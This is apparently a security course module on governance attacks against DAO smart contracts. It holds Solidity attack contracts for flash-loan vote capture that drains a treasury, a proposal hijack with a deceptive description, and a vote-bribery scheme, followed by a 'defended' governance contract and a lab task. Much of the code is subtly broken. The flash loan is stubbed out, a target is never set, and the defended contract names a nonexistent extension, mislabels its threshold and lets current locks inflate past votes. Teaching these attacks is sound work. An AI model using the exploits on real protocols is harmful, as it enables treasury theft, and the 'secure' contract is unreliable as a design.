# Module 9 — Governance Attacks: Voting and Proposal Manipulation

## What You'll Actually Do

You will exploit governance mechanisms using flash loan voting, proposal hijacking, and voter bribery. Then you will build defended governance systems with timelocks, quorum requirements, and vote escrow mechanisms that resist these attacks.

## Flash Loan Governance Attacks

Attacker flash-borrows massive voting power, passes a proposal to drain treasury, then repays the loan — all in one transaction.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract GovernanceExploit {
    IGovernor public governor;
    IERC20 public governanceToken;
    address public treasury;

    constructor(address _governor, address _token, address _treasury) {
        governor = IGovernor(_governor);
        governanceToken = IERC20(_token);
        treasury = _treasury;
    }

    // Flash loan governance attack
    function executeAttack(
        uint256 proposalId,
        bytes calldata attackData
    ) external {
        // 1. Flash borrow governance tokens
        uint256 votesNeeded = _getQuorumVotes();
        _flashBorrowTokens(votesNeeded);

        // 2. Delegate votes to attacker
        governanceToken.delegate(address(this));

        // 3. Vote on malicious proposal
        governor.castVote(proposalId, 1); // 1 = for

        // 4. Execute proposal that drains treasury
        if (governor.state(proposalId) == 4) { // Succeeded
            governor.execute(proposalId);
        }

        // 5. Repay flash loan
        _repayTokens(votesNeeded);
    }

    function _flashBorrowTokens(uint256 amount) internal {
        // Use Aave or similar for flash loans
        // Pool.flashLoanSimple(address(this), governanceToken, amount, "", 0);
    }

    function _repayTokens(uint256 amount) internal {
        governanceToken.transfer(msg.sender, amount);
    }

    function _getQuorumVotes() internal view returns (uint256) {
        return governanceToken.totalSupply() / 10; // 10% quorum
    }
}
```

## Proposal Hijacking

Attacker submits a legitimate-looking proposal but embeds malicious executable code.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract ProposalHijack {
    IGovernor public governor;
    address public target;

    constructor(address _governor) {
        governor = IGovernor(_governor);
    }

    // Proposal that looks benign but drains funds
    function createMaliciousProposal() external returns (uint256) {
        // Visible: "Update community guidelines"
        // Hidden: executes arbitrary call to drain treasury
        bytes memory payload = abi.encodeWithSignature(
            "transfer(address,uint256)",
            msg.sender,
            1000 ether
        );

        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);

        targets[0] = target;
        values[0] = 0;
        calldatas[0] = payload;

        // Propose with misleading description
        uint256 proposalId = governor.propose(
            targets,
            values,
            calldatas,
            "Update community guidelines to reflect latest standards"
        );

        return proposalId;
    }
}

// Voter bribery contract
contract VoteBribery {
    mapping(uint256 => mapping(address => uint256)) public bribeAmount;
    mapping(uint256 => uint256) public totalBribed;
    address public token;

    constructor(address _token) {
        token = _token;
    }

    // Bribe voters to vote a specific way
    function setBribe(
        uint256 proposalId,
        uint256 amountPerVote
    ) external {
        bribeAmount[proposalId][msg.sender] = amountPerVote;
        totalBribed[proposalId] += amountPerVote;
    }

    // Voters claim bribe after voting
    function claimBribe(uint256 proposalId) external {
        uint256 amount = bribeAmount[proposalId][msg.sender];
        require(amount > 0, "No bribe");

        IERC20(token).transfer(msg.sender, amount);
        delete bribeAmount[proposalId][msg.sender];
    }

    // Check if bribe makes attack profitable
    function isProfitable(
        uint256 proposalId,
        uint256 treasuryDrainAmount
    ) public view returns (bool) {
        return treasuryDrainAmount > totalBribed[proposalId];
    }
}
```

## Defended Governance Implementation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/governance/Governor.sol";
import "@openzeppelin/contracts/governance/extensions/GovernorSettings.sol";
import "@openzeppelin/contracts/governance/extensions/GovernorCountingSimpleVotes.sol";
import "@openzeppelin/contracts/governance/extensions/GovernorVotes.sol";
import "@openzeppelin/contracts/governance/extensions/GovernorVotesQuorumFraction.sol";
import "@openzeppelin/contracts/governance/extensions/GovernorTimelockControl.sol";

contract SecureGovernance is
    Governor,
    GovernorSettings,
    GovernorCountingSimpleVotes,
    GovernorVotes,
    GovernorVotesQuorumFraction,
    GovernorTimelockControl
{
    uint256 public constant MIN_PROPOSAL_TOKENS = 10000 ether;
    uint256 public constant PROPOSAL_THRESHOLD = 4; // 4% of supply
    uint256 public constant VOTING_DELAY = 7 days; // Time to review
    uint256 public constant VOTING_PERIOD = 14 days; // Long voting window
    uint256 public constant TIMELOCK_DELAY = 3 days; // Post-vote delay

    mapping(address => uint256) public proposalDeposit;
    mapping(uint256 => bool) public proposalAudited;

    event ProposalAudited(uint256 proposalId, address auditor);

    constructor(IVotes _token, TimelockController _timelock)
        Governor("SecureGovernance")
        GovernorSettings(
            PROPOSAL_THRESHOLD,
            VOTING_DELAY,
            VOTING_PERIOD
        )
        GovernorCountingSimpleVotes()
        GovernorVotes(_token)
        GovernorVotesQuorumFraction(10) // 10% quorum
        GovernorTimelockControl(_timelock)
    {}

    // FIX 1: Proposal deposit — expensive to create proposals
    function propose(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) public override(Governor, GovernorSettings) returns (uint256) {
        require(
            proposalDeposit[msg.sender] >= MIN_PROPOSAL_TOKENS,
            "Insufficient deposit"
        );

        return super.propose(targets, values, calldatas, description);
    }

    function depositProposalTokens() external payable {
        proposalDeposit[msg.sender] += msg.value / 1 ether;
    }

    // FIX 2: Community audit period before voting starts
    function state(uint256 proposalId)
        public
        view
        override(Governor, GovernorTimelockControl)
        returns (ProposalState)
    {
        ProposalState currentState = super.state(proposalId);

        // If proposal is pending, check if audit period passed
        if (currentState == ProposalState.Pending) {
            uint256 proposalSnapshot = proposalSnapshot(proposalId);
            if (block.timestamp < proposalSnapshot + VOTING_DELAY) {
                return ProposalState.Pending;
            }
        }

        return currentState;
    }

    // FIX 3: Allow community to flag suspicious proposals
    mapping(uint256 => uint256) public flagCount;
    mapping(uint256 => mapping(address => bool)) public flagged;

    function flagProposal(uint256 proposalId) external {
        require(!flagged[proposalId][msg.sender], "Already flagged");
        flagged[proposalId][msg.sender] = true;
        flagCount[proposalId]++;
    }

    // FIX 4: Vote escrow — lock tokens for boosted voting power
    mapping(address => uint256) public lockEnd;
    mapping(address => uint256) public lockedAmount;

    function lockTokens(uint256 amount, uint256 unlockTime) external {
        require(unlockTime > block.timestamp + 30 days, "Min lock 30 days");
        require(unlockTime <= block.timestamp + 365 days, "Max lock 1 year");

        lockedAmount[msg.sender] += amount;
        lockEnd[msg.sender] = unlockTime;

        IERC20(token()).transferFrom(msg.sender, address(this), amount);
    }

    function getVotes(address account, uint256 blockNumber)
        public
        view
        override(GovernorVotes)
        returns (uint256)
    {
        uint256 baseVotes = super.getVotes(account, blockNumber);
        uint256 locked = lockedAmount[account];

        if (locked > 0 && lockEnd[account] > block.timestamp) {
            // Boost: up to 2x voting power for max lock
            uint256 remaining = lockEnd[account] - block.timestamp;
            uint256 multiplier = 1e18 + (remaining * 1e18 / 365 days);
            if (multiplier > 2e18) multiplier = 2e18;
            return baseVotes + (locked * multiplier / 1e18);
        }

        return baseVotes;
    }

    // Required overrides
    function quorum(uint256 blockNumber)
        public
        view
        override(Governor, GovernorVotesQuorumFraction)
        returns (uint256)
    {
        return super.quorum(blockNumber);
    }

    function _queueOperations(
        uint256 proposalId,
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    )
        internal
        override(Governor, GovernorTimelockControl)
        returns (uint48)
    {
        return super._queueOperations(
            proposalId, targets, values, calldatas, descriptionHash
        );
    }

    function _executeOperations(
        uint256 proposalId,
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    ) internal override(Governor, GovernorTimelockControl) {
        super._executeOperations(
            proposalId, targets, values, calldatas, descriptionHash
        );
    }

    function _cancel(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    )
        internal
        override(Governor, GovernorTimelockControl)
        returns (uint256)
    {
        return super._cancel(targets, values, calldatas, descriptionHash);
    }

    function _executor()
        internal
        view
        override(Governor, GovernorTimelockControl)
        returns (address)
    {
        return super._executor();
    }
}
```

## Assessment

**Lab Task:** Deploy a governance system with a treasury. Execute a flash loan governance attack to drain the treasury. Then deploy the defended governance contract with timelock, quorum, proposal deposit, and vote escrow. Demonstrate that the same attack now fails against the defended system.

**Time:** 130 minutes

**Grading:**
- Flash loan governance attack draining treasury (25 points)
- Proposal hijacking with misleading description (15 points)
- Defended governance with timelock and quorum (25 points)
- Vote escrow mechanism with time-weighted voting (20 points)
- Attack failure demonstration against defended system (15 points)

## Evidence

- Governance attack contract with flash loan integration
- Exploit execution showing treasury drain
- Defended governance contract with all security features
- Attack replay against defended system showing failure
- Comparison of attack costs before and after defense
